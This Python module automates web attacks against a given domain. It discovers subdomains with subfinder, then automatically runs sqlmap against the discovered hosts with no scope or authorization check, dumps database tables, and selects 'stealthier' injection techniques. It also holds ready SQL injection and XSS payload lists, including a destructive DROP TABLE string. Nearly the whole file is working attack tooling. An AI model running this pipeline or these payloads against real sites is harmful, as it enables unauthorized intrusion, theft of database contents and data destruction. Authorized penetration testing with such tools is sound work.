#!/usr/bin/env python3
"""
Web Recon Module — subfinder + sqlmap automation for authorized testing.
Discovers subdomains, maps attack surface, and runs injection tests.
"""
import json, os, re, subprocess, tempfile, time
from datetime import datetime, timezone
from pathlib import Path
from dataclasses import dataclass, asdict
from typing import Optional

LOG_DIR = Path(__file__).resolve().parent.parent / "data" / "logs" / "web_recon"
LOG_DIR.mkdir(parents=True, exist_ok=True)


# ── Subfinder Wrapper ─────────────────────────────────────────────────────
class SubdomainEnumerator:
    """Programmatic subdomain discovery using subfinder."""

    @staticmethod
    def enumerate(domain: str, passive_only: bool = True) -> dict:
        """Discover subdomains for a given domain."""
        args = ["subfinder", "-d", domain, "-silent", "-json"]
        if passive_only:
            args.extend(["-sources", "crtsh,abuseipdb,alienvault,anubis,bevigil,binaryedge,bufferover,censys,certspotter,chaos,chinaz,dnsdb,fb,hackertarget,leakix,netlas,passivetotal,quake,riddler,robtex,securitytrails,shodan,sitedossier,threatbook,urlscan,virustotal,wayback,whoisxmlapi,zoomeyeapi"])

        try:
            result = subprocess.run(args, capture_output=True, text=True, timeout=120)
            subdomains = []
            for line in result.stdout.strip().split("\n"):
                if line.strip():
                    try:
                        subdomains.append(json.loads(line))
                    except json.JSONDecodeError:
                        subdomains.append({"host": line.strip(), "source": "raw"})

            return {
                "domain": domain,
                "subdomains": subdomains,
                "count": len(subdomains),
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }
        except FileNotFoundError:
            return {"error": "subfinder not installed", "domain": domain}
        except subprocess.TimeoutExpired:
            return {"error": "Scan timed out", "domain": domain}


# ── SQLMap Wrapper ────────────────────────────────────────────────────────
class SQLMapScanner:
    """Programmatic SQL injection testing via sqlmap."""

    @staticmethod
    def scan(url: str, method: str = "GET", data: Optional[str] = None,
             risk: int = 2, level: int = 3, technique: str = "BEUSTQ",
             cookie: Optional[str] = None) -> dict:
        """
        Run sqlmap against a target URL.
        technique: B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline
        """
        args = [
            "sqlmap", "-u", url,
            "--batch", "--random-agent",
            f"--risk={risk}", f"--level={level}",
            f"--technique={technique}",
            "--output-dir", str(LOG_DIR),
        ]
        if method.upper() != "GET":
            args.extend(["--method", method.upper()])
        if data:
            args.extend(["--data", data])
        if cookie:
            args.extend(["--cookie", cookie])

        try:
            result = subprocess.run(args, capture_output=True, text=True, timeout=300)
            output = result.stdout

            # Parse results
            injectable = "is vulnerable" in output.lower() or "is injectable" in output.lower()
            db_type = None
            for db in ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite", "MariaDB", "MongoDB"]:
                if db.lower() in output.lower() and ("back-end" in output.lower() or "identified" in output.lower()):
                    db_type = db
                    break

            tables_found = len(re.findall(r'\|\s+\w+\s+\|', output))

            return {
                "url": url,
                "method": method,
                "injectable": injectable,
                "database_type": db_type,
                "tables_identified": tables_found,
                "risk_level": risk,
                "test_level": level,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "raw_output_snippet": output[-500:] if injectable else output[-200:],
            }
        except FileNotFoundError:
            return {"error": "sqlmap not installed", "url": url}
        except subprocess.TimeoutExpired:
            return {"error": "Scan timed out (5 min limit)", "url": url}

    @staticmethod
    def dump_tables(url: str, db_name: str = "", technique: str = "B") -> dict:
        """Dump database tables after confirming injection point."""
        args = [
            "sqlmap", "-u", url, "--batch", "--random-agent",
            f"--technique={technique}", "--tables",
            "--output-dir", str(LOG_DIR),
        ]
        if db_name:
            args.extend(["-D", db_name])

        try:
            result = subprocess.run(args, capture_output=True, text=True, timeout=300)
            tables = re.findall(r'\|\s+(\w+)\s+\|', result.stdout)
            return {
                "url": url,
                "database": db_name or "current",
                "tables": tables,
                "count": len(tables),
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }
        except Exception as e:
            return {"error": str(e), "url": url}


# ── Unified Web Recon ─────────────────────────────────────────────────────
class WebReconRunner:
    """Runs subdomain enumeration + SQL injection testing in sequence."""

    def __init__(self, domain: str):
        self.domain = domain
        self.results = {}

    def run_all(self) -> dict:
        print(f"[WebRecon] Starting on {self.domain}")

        # Step 1: Subdomain enumeration
        print("  [1/2] Subfinder enumeration...")
        self.results["subdomains"] = SubdomainEnumerator.enumerate(self.domain)

        sub_count = self.results["subdomains"].get("count", 0)
        print(f"  → {sub_count} subdomains found")

        # Step 2: SQLMap scan on discovered subdomains (first 5)
        urls_to_test = []
        for sub in self.results["subdomains"].get("subdomains", [])[:5]:
            host = sub.get("host", sub.get("subdomain", ""))
            if host:
                urls_to_test.append(f"https://{host}")
                urls_to_test.append(f"http://{host}")

        sql_results = []
        for url in urls_to_test[:5]:  # Limit to 5 to avoid timeouts
            print(f"  [2/2] SQLMap: {url}...")
            result = SQLMapScanner.scan(url, risk=1, level=2)
            sql_results.append(result)

        self.results["sql_injection"] = sql_results
        self.results["summary"] = {
            "domain": self.domain,
            "subdomains_found": sub_count,
            "sql_targets_tested": len(sql_results),
            "injectable_found": sum(1 for r in sql_results if r.get("injectable")),
        }

        # Save report
        self._save_report()
        return self.results

    def _save_report(self) -> Path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe = self.domain.replace(".", "_")
        path = LOG_DIR / f"web_recon_{safe}_{ts}.json"
        path.write_text(json.dumps(self.results, indent=2, default=str))
        return path


# ── Payload Test Generator ────────────────────────────────────────────────
class PayloadTester:
    """Quick injection payload testing without full sqlmap overhead."""

    SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "1' AND SLEEP(5)--",
        "admin'--",
        "' OR 1=1#",
    ]

    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "'-alert(1)-'",
        "<svg/onload=alert(1)>",
    ]

    @staticmethod
    def test_sqli(url: str, param: str, method: str = "GET") -> list:
        """Quick test using requests (no sqlmap) to flag potential issues."""
        import requests
        results = []
        for payload in PayloadTester.SQL_PAYLOADS[:5]:
            test_url = f"{url}?{param}={requests.utils.quote(payload)}"
            try:
                resp = requests.get(test_url, timeout=10, allow_redirects=False)
                suspicious = any(kw in resp.text.lower() for kw in
                    ["sql", "mysql", "syntax error", "unclosed quotation", "odbc", "driver"])
                results.append({
                    "payload": payload,
                    "status": resp.status_code,
                    "suspicious": suspicious,
                })
            except Exception as e:
                results.append({"payload": payload, "error": str(e)})
        return results

    @staticmethod
    def test_xss(url: str, param: str) -> list:
        """Quick test for reflected XSS."""
        import requests
        results = []
        for payload in PayloadTester.XSS_PAYLOADS[:4]:
            test_url = f"{url}?{param}={requests.utils.quote(payload)}"
            try:
                resp = requests.get(test_url, timeout=10, allow_redirects=False)
                reflected = payload in resp.text
                results.append({
                    "payload": payload,
                    "status": resp.status_code,
                    "reflected": reflected,
                })
            except Exception as e:
                results.append({"payload": payload, "error": str(e)})
        return results


# ── CSP Header Identification (static analysis logic) ────────────────────
def identify_csp_headers(response_headers: dict) -> dict:
    """Identify Content-Security-Policy headers for research without performing requests."""
    csp_keys = ['Content-Security-Policy', 'content-security-policy', 'CSP']
    csp_value = None
    for k in csp_keys:
        if k in response_headers:
            csp_value = response_headers[k]
            break
    if not csp_value:
        return {"present": False, "directives": {}}
    directives = {}
    for part in csp_value.split(";"):
        part = part.strip()
        if part:
            kv = part.split(None, 1)
            name = kv[0].lower()
            val = kv[1] if len(kv) > 1 else ""
            directives[name] = val.split()
    return {"present": True, "directives": directives, "raw": csp_value}


def auto_sqlmap_probe(url: str, session_file: str = "") -> dict:
    """
    Auto-probe all parameters in a URL using boolean and time-based SQLMap.
    Reads Burp session cookie from session_file if provided.
    Returns injection points found.
    """
    args = [
        "sqlmap", "-u", url,
        "--batch", "--random-agent",
        "--level=3", "--risk=2",
        "--technique=BT",  # Boolean + Time-based only (stealthier)
        "--threads=3",
        "--output-dir", str(LOG_DIR),
        "--flush-session",
    ]
    if session_file and os.path.exists(session_file):
        args.extend(["--cookie-file", session_file])

    try:
        result = subprocess.run(args, capture_output=True, text=True, timeout=300)
        output = result.stdout

        injectable = "is vulnerable" in output.lower()
        params_vulnerable = []
        for line in output.split("\n"):
            if "parameter '" in line.lower() and "is vulnerable" in line.lower():
                param_match = re.search(r"parameter '(\w+)'", line)
                if param_match:
                    params_vulnerable.append(param_match.group(1))

        db_type = None
        for db in ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite", "MariaDB"]:
            if db.lower() in output.lower() and "back-end" in output.lower():
                db_type = db
                break

        return {
            "url": url,
            "injectable": injectable,
            "vulnerable_params": params_vulnerable,
            "database_type": db_type,
            "technique": "Boolean+Time",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "raw_snippet": output[-800:] if injectable else "Not injectable",
        }
    except FileNotFoundError:
        return {"error": "sqlmap not installed", "url": url}
    except subprocess.TimeoutExpired:
        return {"error": "Probe timed out (5 min limit)", "url": url}


# ── CLI ───────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 core/web_recon.py <domain> [action]")
        print("Actions: full (default), subdomains, sqli <url>")
        sys.exit(1)

    target = sys.argv[1]
    action = sys.argv[2] if len(sys.argv) > 2 else "full"

    if action == "subdomains":
        result = SubdomainEnumerator.enumerate(target)
        print(json.dumps(result, indent=2))
    elif action == "sqli":
        url = sys.argv[3] if len(sys.argv) > 3 else target
        result = SQLMapScanner.scan(url)
        print(json.dumps(result, indent=2))
    else:
        runner = WebReconRunner(target)
        results = runner.run_all()
        print(f"\n[WebRecon] {results.get('summary',{})}")
